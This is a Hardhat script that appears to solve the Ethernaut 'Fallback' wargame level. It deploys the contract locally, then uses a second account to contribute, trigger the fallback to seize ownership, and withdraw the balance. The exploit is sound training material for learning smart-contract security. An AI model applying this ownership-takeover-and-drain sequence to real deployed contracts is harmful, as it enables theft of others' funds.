const { network, deployments, ethers, getNamedAccounts } = require("hardhat");

async function main() {
  const [owner, addr1, addr2] = await ethers.getSigners();

  console.log("Deployer : ", owner.address);

  const Fallback = await ethers.getContractFactory("Fallback");
  const fallback = await Fallback.deploy();

  await fallback.deployed();

  const hacker = fallback.connect(addr1);

  // ------------ let's hack -------------

  console.log(
    `Balance : ${await fallback.getBalance()} by ${await fallback.getOwner()}`
  );

  await hacker.contribute({ value: "1" });
  await addr1.sendTransaction({
    to: fallback.address,
    value: 1,
  });
  await hacker.withdraw();

  console.log(
    `Balance : ${await fallback.getBalance()} by ${await fallback.getOwner()}`
  );
}

// hh run scripts/ethernaut1.js --network hardhat
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
